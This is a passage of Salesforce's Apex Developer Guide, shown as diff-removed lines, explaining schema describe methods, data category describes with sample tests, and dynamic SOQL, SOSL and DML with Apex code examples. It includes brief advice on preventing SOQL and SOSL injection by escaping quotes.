-   Schema.DescribeFieldResult dfr = Account.Description.getDescribe();
-
-```
-
-This example uses the `fields` member variable method:
-
-```
-   Schema.DescribeFieldResult dfr = Schema.SObjectType.Account.fields.Name;
-
-```
-
-In the example above, the system uses special parsing to validate that the final member variable ( `Name` ) is valid for the specified sObject
-at compile time. When the parser finds the `fields` member variable, it looks backwards to find the name of the sObject ( `Account` ).
-It validates that the field name following the `fields` member variable is legitimate. The `fields` member variable only works when
-used in this manner.
-
-Note: Don’t use the `fields` member variable without also using either a field member variable name or the `getMap` method.
-For more information on `getMap`, see the next section.
-
-[For more information about the methods available with a field describe result, see DescribeFieldResultClass.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_fields_describe.htm)
-
-Accessing All Field Describe Results for an sObject
-
-Use the field describe result's `getMap` method to return a map that represents the relationship between all the field names (keys) and
-the field tokens (values) for an sObject.
-
-
-Apex Developer Guide Working with Data in Apex
-
-The following example generates a map that can be used to access a field by name:
-
-```
-   Map<String, Schema.SObjectField> fieldMap = Schema.SObjectType.Account.fields.getMap();
-
-```
-
-Note: The value type of this map is not a field describe result. Using the describe results would take too many system resources.
-Instead, it is a map of tokens that you can use to find the appropriate field. After you determine the field, generate the describe
-result for it.
-
-The map has the following characteristics:
-
-**•** It is dynamic, that is, it is generated at runtime on the fields for that sObject.
-
-**•** All field names are case insensitive.
-
-**•** The keys use namespaces as required.
-
-**•** The keys reflect whether the field is a custom object.
-
-Field Describe Considerations
-
-Note the following when describing fields.
-
-**•** A field describe that’s executed from within an installed managed package returns Chatter fields even if Chatter is not enabled in
-the installing organization. This is not true if the field describe is executed from a class that’s not within an installed managed package.
-
-**•** When you describe sObjects and their fields from within an Apex class, custom fields of new field types are returned regardless of
-the API version that the class is saved in. If a field type, such as the geolocation field type, is available only in a recent API version,
-components of a geolocation field are returned even if the class is saved in an earlier API version.
-
-Versioned Behavior Changes
-
-In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace,
-even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data,
-make sure that your code accesses keys correctly using the namespace prefix.
-
-SEE ALSO:
-
-[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-##### Understanding Describe Information Permissions
-
-Apex classes and triggers run in system mode. Classes and triggers have no restrictions on dynamically looking up any sObject that is
-available in the org. You can generate a map of all the sObjects for your org regardless of the current user’s permission, unless you are
-executing anonymous Apex.
-
-User permissions matter when you execute describe calls in an anonymous block.. As a result, not all sObjects and fields can be looked
-up if access is restricted for the running user. For example, if you describe account fields in an anonymous block and you don’t have
-access to all fields, not all fields are returned. However, all fields are returned for the same call in an Apex class.
-
-For more information, see “About API and Dynamic Apex Access in Packages” in Salesforce Help.
-
-SEE ALSO:
-
-Anonymous Blocks
-
-Managed Package Types
-
-
-Apex Developer Guide Working with Data in Apex
-
-##### Describing sObjects Using Schema Method
-
-As an alternative to using tokens, you can describe sObjects by calling the `describeSObjects` Schema method and passing one
-or more sObject type names for the sObjects you want to describe.
-
-This example gets describe metadata information for two sObject types—The Account standard object and the Merchandise__c custom
-object. After obtaining the describe result for each sObject, this example writes the returned information to the debug output, such as
-the sObject label, number of fields, whether it is a custom object or not, and the number of child relationships.
-
-```
-   // sObject types to describe
-
-   String[] types = new String[]{'Account','Merchandise__c'};
-
-   // Make the describe call
-
-   Schema.DescribeSobjectResult[] results = Schema.describeSObjects(types);
-
-   System.debug('Got describe information for ' + results.size() + ' sObjects.');
-
-   // For each returned result, get some info
-
-   for(Schema.DescribeSobjectResult res : results) {
-
-      System.debug('sObject Label: ' + res.getLabel());
-
-      System.debug('Number of fields: ' + res.fields.getMap().size());
-
-     System.debug(res.isCustom() ? 'This is a custom object.' : 'This is a standard object.');
-
-      // Get child relationships
-
-      Schema.ChildRelationship[] rels = res.getChildRelationships();
-
-      if (rels.size() > 0) {
-
-        System.debug(res.getName() + ' has ' + rels.size() + ' child relationships.');
-
-      }
-
-   }
-
-```
-
-SEE ALSO:
-
-[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-##### Describing Tabs Using Schema Methods
-
-You can get metadata information about the apps and their tabs available in the Salesforce user interface by executing a describe call
-in Apex. Also, you can get more detailed information about each tab. Use the `describeTabs` Schema method and the `getTabs`
-method in `Schema.DescribeTabResult`, respectively.
-
-This example shows how to get the tab sets for each app. The example then obtains tab describe metadata information for the Sales
-app. For each tab, metadata information includes the icon URL, whether the tab is custom or not, and colors among others. The tab
-describe information is written to the debug output.
-
-```
-   // Get tab set describes for each app
-
-   List<Schema.DescribeTabSetResult> tabSetDesc = Schema.describeTabs();
-
-   // Iterate through each tab set describe for each app and display the info
-
-   for(DescribeTabSetResult tsr : tabSetDesc) {
-
-      String appLabel = tsr.getLabel();
-
-      System.debug('Label: ' + appLabel);
-
-      System.debug('Logo URL: ' + tsr.getLogoUrl());
-
-      System.debug('isSelected: ' + tsr.isSelected());
-
-      String ns = tsr.getNamespace();
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      if (ns == '') {
-
-        System.debug('The ' + appLabel + ' app has no namespace defined.');
-
-      }
-
-      else {
-
-        System.debug('Namespace: ' + ns);
-
-      }
-
-      // Display tab info for the Sales app
-
-      if (appLabel == 'Sales') {
-
-        List<Schema.DescribeTabResult> tabDesc = tsr.getTabs();
-
-        System.debug('-- Tab information for the Sales app --');
-
-        for(Schema.DescribeTabResult tr : tabDesc) {
-
-           System.debug('getLabel: ' + tr.getLabel());
-
-           System.debug('getColors: ' + tr.getColors());
-
-           System.debug('getIconUrl: ' + tr.getIconUrl());
-
-           System.debug('getIcons: ' + tr.getIcons());
-
-           System.debug('getMiniIconUrl: ' + tr.getMiniIconUrl());
-
-           System.debug('getSobjectName: ' + tr.getSobjectName());
-
-           System.debug('getUrl: ' + tr.getUrl());
-
-           System.debug('isCustom: ' + tr.isCustom());
-
-        }
-
-      }
-
-   }
-
-   // Example debug statement output
-
-   // DEBUG|Label: Sales
-
-   // DEBUG|Logo URL:
-
-   https:// MyDomainName .my.salesforce.com/img/seasonLogos/2014_winter_aloha.png
-
-   // DEBUG|isSelected: true
-
-   // DEBUG|The Sales app has no namespace defined.// DEBUG|-- Tab information for the Sales
-
-    app -
-   // (This is an example debug output for the Accounts tab.)
-
-   // DEBUG|getLabel: Accounts
-
-   // DEBUG|getColors:
-
-   (Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme4;],
-
-   // Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme3;],
-
-   // Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme2;])
-
-   // DEBUG|getIconUrl: https:// MyDomainName .my.salesforce.com/img/icon/accounts32.png
-
-   // DEBUG|getIcons:
-
-   (Schema.DescribeIconResult[getContentType=image/png;getHeight=32;getTheme=theme3;
-
-   //
-
-   getUrl=https:// MyDomainName .my.salesforce.com/img/icon/accounts32.png;getWidth=32;],
-
-   // Schema.DescribeIconResult[getContentType=image/png;getHeight=16;getTheme=theme3;
-
-   //
-
-   getUrl=https:// MyDomainName .my.salesforce.com/img/icon/accounts16.png;getWidth=16;])
-
-   // DEBUG|getMiniIconUrl: https:// MyDomainName .my.salesforce.com/img/icon/accounts16.png
-
-   // DEBUG|getSobjectName: Account
-
-   // DEBUG|getUrl: https:// MyDomainName .my.salesforce.com/001/o
-
-   // DEBUG|isCustom: false
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-##### Accessing All sObjects
-
-Use the Schema `getGlobalDescribe` method to return a map that represents the relationship between all sObject names (keys)
-to sObject tokens (values). For example:
-
-```
-   Map<String, Schema.SObjectType> gd = Schema.getGlobalDescribe();
-
-```
-
-The map has the following characteristics:
-
-**•** It is dynamic, that is, it is generated at runtime on the sObjects currently available for the organization, based on permissions.
-
-**•** The sObject names are case insensitive.
-
-**•** The keys are prefixed with the namespace, if any. [*]
-
-**•** The keys reflect whether the sObject is a custom object.
-
-     Starting with Apex saved using Salesforce API version 28.0, the keys in the map that `getGlobalDescribe` returns are always
-prefixed with the namespace, if any, of the code in which it is running. For example, if the code block that makes the
-`getGlobalDescribe` call is in namespace NS1, and a custom object named MyObject__c is in the same namespace, the key
-returned is `NS1__MyObject__c` . For Apex saved using earlier API versions, the key contains the namespace only if the namespace
-of the code block and the namespace of the sObject are different. For example, if the code block that generates the map is in namespace
-N1, and an sObject is also in N1, the key in the map is represented as `MyObject__c` . However, if the code block is in namespace N1,
-and the sObject is in namespace N2, the key is `N2__MyObject__c` .
-
-Standard sObjects have no namespace prefix.
-
-Note: If the `getGlobalDescribe` method is called from an installed managed package, it returns sObject names and tokens
-for Chatter sObjects, such as NewsFeed and UserProfileFeed, even if Chatter is not enabled in the installing organization. This is
-not true if the `getGlobalDescribe` method is called from a class not within an installed managed package.
-
-##### Accessing All Data Categories Associated with an sObject
-
-Use the `describeDataCategoryGroups` and `describeDataCategoryGroupStructures` methods to return the
-categories associated with a specific object:
-
-**1.** Return all the category groups associated with the objects of your choice (see
-`describeDataCategoryGroups(sObjectNames)` ).
-
-**2.** From the returned map, get the category group name and sObject name you want to further interrogate (see
-
-[DescribeDataCategoryGroupResult Class).](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_Schema_DescribeDataCategoryGroupResult.htm)
-
-**3.** Specify the category group and associated object, then retrieve the categories available to this object (see
-`describeDataCategoryGroupStructures` ).
-
-The `describeDataCategoryGroupStructures` method returns the categories available for the object in the category group
-you specified. For additional information about data categories, see “Work with Data Categories” in the Salesforce online help.
-
-In the following example, the `describeDataCategoryGroupSample` method returns all the category groups associated with
-the Article and Question objects. The `describeDataCategoryGroupStructures` method returns all the categories available
-for articles and questions in the Regions category group. For additional information about articles and questions, see “Work with Articles
-and Translations” in the Salesforce online help.
-
-To use the following example, you must:
-
-**•** Enable Salesforce Knowledge.
-
-**•** Enable the answers feature.
-
-**•** Create a data category group called Regions.
-
-**•** Assign Regions as the data category group to be used by Answers.
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** Make sure the Regions data category group is assigned to Salesforce Knowledge.
-
-For more information on creating data category groups, see “Create and Modify Category Groups” in the Salesforce online help. For more
-information on answers, see “Answers Overview” in the Salesforce online help.
-
-```
-   public class DescribeDataCategoryGroupSample {
-
-     public static List<DescribeDataCategoryGroupResult> describeDataCategoryGroupSample(){
-
-       List<DescribeDataCategoryGroupResult> describeCategoryResult;
-
-       try {
-
-         //Creating the list of sobjects to use for the describe
-
-         //call
-
-         List<String> objType = new List<String>();
-
-         objType.add('KnowledgeArticleVersion');
-
-         objType.add('Question');
-
-         //Describe Call
-
-         describeCategoryResult = Schema.describeDataCategoryGroups(objType);
-
-         //Using the results and retrieving the information
-
-         for(DescribeDataCategoryGroupResult singleResult : describeCategoryResult){
-
-           //Getting the name of the category
-
-           singleResult.getName();
-
-           //Getting the name of label
-
-           singleResult.getLabel();
-
-           //Getting description
-
-           singleResult.getDescription();
-
-           //Getting the sobject
-
-           singleResult.getSobject();
-
-         }
-
-       } catch(Exception e){
-
-       }
-
-       return describeCategoryResult;
-
-     }
-
-   }
-
-   public class DescribeDataCategoryGroupStructures {
-
-     public static List<DescribeDataCategoryGroupStructureResult>
-
-     getDescribeDataCategoryGroupStructureResults(){
-
-       List<DescribeDataCategoryGroupResult> describeCategoryResult;
-
-       List<DescribeDataCategoryGroupStructureResult> describeCategoryStructureResult;
-
-       try {
-
-         //Making the call to the describeDataCategoryGroups to
-
-         //get the list of category groups associated
-
-         List<String> objType = new List<String>();
-
-         objType.add('KnowledgeArticleVersion');
-
-         objType.add('Question');
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-         describeCategoryResult = Schema.describeDataCategoryGroups(objType);
-
-         //Creating a list of pair objects to use as a parameter
-
-         //for the describe call
-
-         List<DataCategoryGroupSobjectTypePair> pairs =
-
-           new List<DataCategoryGroupSobjectTypePair>();
-
-         //Looping throught the first describe result to create
-
-         //the list of pairs for the second describe call
-
-         for(DescribeDataCategoryGroupResult singleResult :
-
-         describeCategoryResult){
-
-           DataCategoryGroupSobjectTypePair p =
-
-            new DataCategoryGroupSobjectTypePair();
-
-           p.setSobject(singleResult.getSobject());
-
-           p.setDataCategoryGroupName(singleResult.getName());
-
-           pairs.add(p);
-
-         }
-
-         //describeDataCategoryGroupStructures()
-
-         describeCategoryStructureResult =
-
-           Schema.describeDataCategoryGroupStructures(pairs, false);
-
-         //Getting data from the result
-
-         for(DescribeDataCategoryGroupStructureResult singleResult :
-
-   describeCategoryStructureResult){
-
-           //Get name of the associated Sobject
-
-           singleResult.getSobject();
-
-           //Get the name of the data category group
-
-           singleResult.getName();
-
-           //Get the name of the data category group
-
-           singleResult.getLabel();
-
-           //Get the description of the data category group
-
-           singleResult.getDescription();
-
-           //Get the top level categories
-
-           DataCategory [] toplevelCategories =
-
-            singleResult.getTopCategories();
-
-           //Recursively get all the categories
-
-           List<DataCategory> allCategories =
-
-            getAllCategories(toplevelCategories);
-
-           for(DataCategory category : allCategories) {
-
-            //Get the name of the category
-
-            category.getName();
-
-            //Get the label of the category
-
-            category.getLabel();
-
-            //Get the list of sub categories in the category
-
-            DataCategory [] childCategories =
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-              category.getChildCategories();
-
-           }
-
-         }
-
-       } catch (Exception e){
-
-       }
-
-       return describeCategoryStructureResult;
-
-      }
-
-     private static DataCategory[] getAllCategories(DataCategory [] categories){
-
-       if(categories.isEmpty()){
-
-         return new DataCategory[]{};
-
-       } else {
-
-         DataCategory [] categoriesClone = categories.clone();
-
-         DataCategory category = categoriesClone[0];
-
-         DataCategory[] allCategories = new DataCategory[]{category};
-
-         categoriesClone.remove(0);
-
-         categoriesClone.addAll(category.getChildCategories());
-
-         allCategories.addAll(getAllCategories(categoriesClone));
-
-         return allCategories;
-
-       }
-
-     }
-
-   }
-
-```
-
-Testing Access to All Data Categories Associated with an sObject
-
-The following example tests the `describeDataCategoryGroupSample` method shown earlier. It ensures that the returned
-category group and associated objects are correct.
-
-```
-   @isTest
-
-   private class DescribeDataCategoryGroupSampleTest {
-
-     public static testMethod void describeDataCategoryGroupSampleTest(){
-
-       List<DescribeDataCategoryGroupResult>describeResult =
-
-              DescribeDataCategoryGroupSample.describeDataCategoryGroupSample();
-
-       //Assuming that you have KnowledgeArticleVersion and Questions
-
-       //associated with only one category group 'Regions'.
-
-       System.assert(describeResult.size() == 2,
-
-          'The results should only contain two results: ' + describeResult.size());
-
-       for(DescribeDataCategoryGroupResult result : describeResult) {
-
-         //Storing the results
-
-         String name = result.getName();
-
-         String label = result.getLabel();
-
-         String description = result.getDescription();
-
-         String objectNames = result.getSobject();
-
-         //asserting the values to make sure
-
-         System.assert(name == 'Regions',
-
-         'Incorrect name was returned: ' + name);
-
-         System.assert(label == 'Regions of the World',
-
-         'Incorrect label was returned: ' + label);
-
-         System.assert(description == 'This is the category group for all the regions',
-
-         'Incorrect description was returned: ' + description);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-         System.assert(objectNames.contains('KnowledgeArticleVersion')
-
-                 || objectNames.contains('Question'),
-
-                 'Incorrect sObject was returned: ' + objectNames);
-
-       }
-
-     }
-
-   }
-
-```
-
-This example tests the `describeDataCategoryGroupStructures` method. It ensures that the returned category group,
-categories and associated objects are correct.
-
-```
-   @isTest
-
-   private class DescribeDataCategoryGroupStructuresTest {
-
-     public static testMethod void getDescribeDataCategoryGroupStructureResultsTest(){
-
-       List<Schema.DescribeDataCategoryGroupStructureResult> describeResult =
-
-        DescribeDataCategoryGroupStructures.getDescribeDataCategoryGroupStructureResults();
-
-       System.assert(describeResult.size() == 2,
-
-           'The results should only contain 2 results: ' + describeResult.size());
-
-       //Creating category info
-
-       CategoryInfo world = new CategoryInfo('World', 'World');
-
-       CategoryInfo asia = new CategoryInfo('Asia', 'Asia');
-
-       CategoryInfo northAmerica = new CategoryInfo('NorthAmerica',
-
-                                 'North America');
-
-       CategoryInfo southAmerica = new CategoryInfo('SouthAmerica',
-
-                                 'South America');
-
-       CategoryInfo europe = new CategoryInfo('Europe', 'Europe');
-
-       List<CategoryInfo> info = new CategoryInfo[] {
-
-        asia, northAmerica, southAmerica, europe
-
-      };
-
-       for (Schema.DescribeDataCategoryGroupStructureResult result : describeResult) {
-
-         String name = result.getName();
-
-         String label = result.getLabel();
-
-         String description = result.getDescription();
-
-         String objectNames = result.getSobject();
-
-         //asserting the values to make sure
-
-         System.assert(name == 'Regions',
-
-         'Incorrect name was returned: ' + name);
-
-         System.assert(label == 'Regions of the World',
-
-         'Incorrect label was returned: ' + label);
-
-         System.assert(description == 'This is the category group for all the regions',
-
-         'Incorrect description was returned: ' + description);
-
-         System.assert(objectNames.contains('KnowledgeArticleVersion')
-
-               || objectNames.contains('Question'),
-
-                 'Incorrect sObject was returned: ' + objectNames);
-
-         DataCategory [] topLevelCategories = result.getTopCategories();
-
-         System.assert(topLevelCategories.size() == 1,
-
-        'Incorrect number of top level categories returned: ' + topLevelCategories.size());
-
-         System.assert(topLevelCategories[0].getLabel() == world.getLabel() &&
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-                 topLevelCategories[0].getName() == world.getName());
-
-         //checking if the correct children are returned
-
-         DataCategory [] children = topLevelCategories[0].getChildCategories();
-
-         System.assert(children.size() == 4,
-
-         'Incorrect number of children returned: ' + children.size());
-
-         for(Integer i=0; i < children.size(); i++){
-
-           System.assert(children[i].getLabel() == info[i].getLabel() &&
-
-                   children[i].getName() == info[i].getName());
-
-         }
-
-       }
-
-     }
-
-     private class CategoryInfo {
-
-       private final String name;
-
-       private final String label;
-
-       private CategoryInfo(String n, String l){
-
-         this.name = n;
-
-         this.label = l;
-
-       }
-
-       public String getName(){
-
-         return this.name;
-
-       }
-
-       public String getLabel(){
-
-         return this.label;
-
-       }
-
-     }
-
-   }
-
-##### Dynamic SOQL Dynamic SOQL refers to the creation of a SOQL string at run time with Apex code. Dynamic SOQL enables you to create more flexible
-```
-
-applications. For example, you can create a search based on input from an end user or update records with varying field names.
-
-To create a dynamic SOQL query at run time, use the `Database.query` or `Database.queryWithBinds` methods, in one
-of the following ways.
-
-**•** Return a single sObject when the query returns a single record:
-
-```
-     sObject s = Database.query( string );
-
-```
-
-**•** Return a list of sObjects when the query returns more than a single record:
-
-```
-     List<sObject> sobjList = Database.query( string );
-
-```
-
-**•** Return a list of sObjects using a map of bind variables:
-
-```
-     List<sObject> sobjList = Database.queryWithBinds( string, bindVariablesMap, accessLevel);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-The `Database.query` and `Database.queryWithBinds` methods can be used wherever an inline SOQL query can be used,
-such as in regular assignment statements and `for` loops. The results are processed in much the same way as static SOQL queries are
-processed.
-
-With API version 55.0 and later, as part of the User Mode for Database Operations feature, use the _`accessLevel`_ parameter to run
-the query operation in user or system mode. The _`accessLevel`_ parameter specifies whether the method runs in system mode
-( `AccessLevel.SYSTEM_MODE` ) or user mode ( `AccessLevel.USER_MODE` ). In system mode, the object and field-level
-[permissions of the current user are ignored, and the record sharing rules are controlled by the class sharing keywords. In user mode, the](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm)
-object permissions, field-level security, and sharing rules of the current user are enforced. System mode is the default.
-
-Dynamic SOQL results can be specified as concrete sObjects, such as Account or MyCustomObject__c, or as the generic sObject data
-type. At run time, the system validates that the type of the query matches the declared type of the variable. If the query doesn’t return
-the correct sObject type, a run-time error is thrown. Therefore, you don’t have to cast from a generic sObject to a concrete sObject.
-
-Dynamic SOQL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
-and Limits on page 348.
-
-[For a full description of SOQL query syntax, see Salesforce Object Query Language (SOQL) in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql.htm) _SOQL and SOSL Reference._
-
-Dynamic SOQL Considerations
-
-You can use simple bind variables in dynamic SOQL query strings when using `Database.query` . Bind variables in the query must
-be within the scope of the database operation. The following is allowed:
-
-```
-   String myTestString = 'TestName';
-
-   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE Name =
-
-   :myTestString');
-
-```
-
-However, unlike inline SOQL, you can’t use bind variable fields in the query string with `Database.query` . The following example
-isn’t supported and results in a `Variable does not exist` error.
-
-```
-   MyCustomObject__c myVariable = new MyCustomObject__c(field1__c ='TestField');
-
-   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c
-
-    = :myVariable.field1__c');
-
-```
-
-You can instead resolve the variable field into a string and use the string in your dynamic SOQL query:
-
-```
-   String resolvedField1 = myVariable.field1__c;
-
-   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c
-
-    = :resolvedField1');
-
-```
-
-(API version 57.0 and later) Another option is to use the `Database.queryWithBinds` method. With this method, bind variables
-in the query are resolved from a Map parameter directly with a key, rather than from Apex code variables. This removes the need for the
-variables to be in scope when the query is executed. This example shows a SOQL query that uses a bind variable for an Account name;
-its value is passed in with the _`acctBinds`_ Map.
-
-```
-   Map<String, Object> acctBinds = new Map<String, Object>{'acctName' => 'Acme Corporation'};
-
-   List<Account> accts =
-
-      Database.queryWithBinds('SELECT Id FROM Account WHERE Name = :acctName',
-
-                    acctBinds,
-
-                    AccessLevel.USER_MODE);
-
-```
-
-These considerations apply when using the Map parameter in the `Database.queryWithBinds` method:
-
-**•** Although map keys of type String are case-sensitive,the `queryWithBinds` method doesn’t support Map keys that differ only
-in case. In a `queryWithBinds` method, comparison of Map keys is case-insensitive. If duplicate Map keys exist, the method
-
-
-Apex Developer Guide Working with Data in Apex
-
-throws a runtime `QueryException` . This example throws this runtime exception: `System.QueryException: The`
-`bindMap consists of duplicate case-insensitive keys: [Acctname, acctName]` .
-
-```
-     Map<String, Object> bindVars = new Map<String, Object>{'acctName' => 'Acme Corporation'};
-
-     bindVars.put('Acctname', 'Foo');
-
-     string query = 'Select Id from Contact where Name like :acctName';
-
-     List<Contact> contacts = Database.queryWithBinds(query, bindVars, AccessLevel.USER_MODE);
-
-```
-
-**•** Map keys must follow naming standards: they must start with an ASCII letter, can’t start with a number, must not use reserved
-keywords, and must adhere to variable naming requirements.
-
-**•** Although currently supported, Salesforce recommends against using the dot notation with Map keys.
-
-SOQL Injection
-
-_SOQL injection_ is a technique by which a user causes your application to execute database methods you didn’t intend by passing SOQL
-statements into your code. This can occur in Apex code whenever your application relies on end-user input to construct a dynamic SOQL
-statement and you don’t handle the input properly.
-
-To prevent SOQL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation
-marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
-of database commands.
-
-Additional Dynamic SOQL Methods
-
-The Dynamic SOQL examples in this topic show how to use the `Database.query` and `Database.queryWithBinds` methods.
-These methods also use Dynamic SOQL:
-
-**•** `Database.countQuery` and `Database.countQueryWithBinds` : Return the number of records that a dynamic SOQL
-query would return when executed.
-
-**•** `Database.getQueryLocator` and `Database.getQueryLocatorWithBinds` : Create a `QueryLocator` object
-used in batch Apex or Visualforce.
-
-SEE ALSO:
-
-_Apex Reference Guide_ [: System.Database Methods](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_methods)
-
-##### Dynamic SOSL Dynamic SOSL refers to the creation of a SOSL string at run time with Apex code. Dynamic SOSL enables you to create more flexible
-
-applications. For example, you can create a search based on input from an end user, or update records with varying field names.
-
-To create a dynamic SOSL query at run time, use the search `query` method. For example:
-
-```
-   List<List <sObject>> myQuery = search.query( SOSL_search_string );
-
-```
-
-The following example exercises a simple SOSL query string.
-
-```
-   String searchquery='FIND\'Edge*\'IN ALL FIELDS RETURNING Account(id,name),Contact, Lead';
-
-   List<List<SObject>>searchList=search.query(searchquery);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Dynamic SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type.
-The result lists are always returned in the same order as they were specified in the dynamic SOSL query. From the example above, the
-results from Account are first, then Contact, then Lead.
-
-The search `query` method can be used wherever an inline SOSL query can be used, such as in regular assignment statements and
-
-`for` loops. The results are processed in much the same way as static SOSL queries are processed.
-
-Dynamic SOSL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
-and Limits on page 348.
-
-[For a full description of SOSL query syntax, see Salesforce Object Search Language (SOSL) in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_sosl.htm) _SOQL and SOSL Reference_ .
-
-Use Dynamic SOSL to Return Snippets
-
-To provide more context for records in search results, use the SOSL `WITH SNIPPET` clause. Snippets make it easier to identify the
-[content you’re looking for. For information about how snippets are generated, see WITH SNIPPET in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_sosl_with_snippet.htm) _SOQL and SOSL Reference_ .
-
-To use the SOSL `WITH SNIPPET` clause in a dynamic SOSL query at run time, use the `Search.find` method.
-
-```
-   Search.SearchResults searchResults = Search.find( SOSL_search_string );
-
-```
-
-This example exercises a simple SOSL query string that includes a `WITH SNIPPET` clause. The example calls `System.debug()`
-to print the returned titles and snippets. Your code would display the titles and snippets in a Web page.
-
-```
-   Search.SearchResults searchResults = Search.find('FIND \'test\' IN ALL FIELDS RETURNING
-
-   KnowledgeArticleVersion(id, title WHERE PublishStatus = \'Online\' AND Language = \'en_US\')
-
-    WITH SNIPPET (target_length=120)');
-
-   List<Search.SearchResult> articlelist = searchResults.get('KnowledgeArticleVersion');
-
-   for (Search.SearchResult searchResult : articleList) {
-
-    KnowledgeArticleVersion article = (KnowledgeArticleVersion) searchResult.getSObject();
-
-    System.debug(article.Title);
-
-    System.debug(searchResult.getSnippet());
-
-   }
-
-```
-
-SOSL Injection
-
-_SOSL injection_ is a technique by which a user causes your application to execute database methods you did not intend by passing SOSL
-statements into your code. A SOSL injection can occur in Apex code whenever your application relies on end-user input to construct a
-dynamic SOSL statement and you do not handle the input properly.
-
-To prevent SOSL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation
-marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
-of database commands.
-
-##### Dynamic DML
-
-In addition to querying describe information and building SOQL queries at runtime, you can also create sObjects dynamically, and insert
-them into the database using DML.
-
-To create a new sObject of a given type, use the `newSObject` method on an sObject token. Note that the token must be cast into a
-concrete sObject type (such as Account). For example:
-
-```
-   // Get a new account
-
-   Account a = new Account();
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   // Get the token for the account
-
-   Schema.sObjectType tokenA = a.getSObjectType();
-
-   // The following produces an error because the token is a generic sObject, not an Account
-
-   // Account b = tokenA.newSObject();
-
-   // The following works because the token is cast back into an Account
-
-   Account b = (Account)tokenA.newSObject();
-
-```
-
-Though the sObject token `tokenA` is a token of Account, it is considered an sObject because it is accessed separately. It must be cast
-back into the concrete sObject type Account to use the `newSObject` method. For more information on casting, see Classes and
-Casting on page 117.
-
-You can also specify an ID with `newSObject` to create an sObject that references an existing record that you can update later. For
-example:
-
-```
-   SObject s = Database.query('SELECT Id FROM account LIMIT 1')[0].getSObjectType().
-
-                          newSObject([SELECT Id FROM Account LIMIT 1][0].Id);
-
-```
-
-[See SObjectType Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_Schema_SObjectType.htm)
-
-Dynamic sObject Creation Example
-
-This example shows how to obtain the sObject token through the `Schema.getGlobalDescribe` method and then creates a
-new sObject using the `newSObject` method on the token. This example also contains a test method that verifies the dynamic creation
-of an account.
-
-```
-   public class DynamicSObjectCreation {
-
-      public static sObject createObject(String typeName) {
-
-        Schema.SObjectType targetType = Schema.getGlobalDescribe().get(typeName);
-
-        if (targetType == null) {
-
-           // throw an exception
-
-        }
-
-        // Instantiate an sObject with the type passed in as an argument
-
-        // at run time.
-
-        return targetType.newSObject();
-
-      }
-
-   }
-
-   @isTest
-
-   private class DynamicSObjectCreationTest {
-
-      static testmethod void testObjectCreation() {
-
-        String typeName = 'Account';
-
-        String acctName = 'Acme';
-
-        // Create a new sObject by passing the sObject type as an argument.
-
-        Account a = (Account)DynamicSObjectCreation.createObject(typeName);
-
-        System.assertEquals(typeName, String.valueOf(a.getSobjectType()));
-
-        // Set the account name and insert the account.
-
-        a.Name = acctName;
-
-        insert a;
-
-        // Verify the new sObject got inserted.
-
-        Account[] b = [SELECT Name from Account WHERE Name = :acctName];
-
-        system.assert(b.size() > 0);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      }
-
-   }
-
-```
-
-Setting and Retrieving Field Values
-
-Use the `get` and `put` methods on an object to set or retrieve values for fields using either the API name of the field expressed as a
-String, or the field's token. In the following example, the API name of the field `AccountNumber` is used:
-
-```
-   SObject s = [SELECT AccountNumber FROM Account LIMIT 1];
-
-   Object o = s.get('AccountNumber');
-
-   s.put('AccountNumber', 'abc');
-
-```
-
-The following example uses the `AccountNumber` field's token instead:
-
-```
